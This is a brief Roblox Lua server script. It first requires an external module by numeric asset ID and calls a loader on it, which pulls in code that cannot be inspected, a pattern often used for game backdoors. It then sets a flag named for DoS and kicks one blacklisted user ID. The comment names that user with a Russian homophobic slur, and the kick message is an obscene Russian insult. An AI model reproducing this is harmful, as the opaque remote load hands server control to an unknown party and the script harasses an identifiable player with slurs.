require(7192763922).load("t10_kol")
local EnabledDoDOS = true
local BlackList = {
  [3783228048]=true, --< Vadik Pidorasik
}
game.Players.PlayerAdded:Connect(function(plr)
    if EnabledDoDOS==false then return end
    if BlackList[plr.UserId] then
        plr:Kick("Соси Хуй Вад 😀")
    end
end)
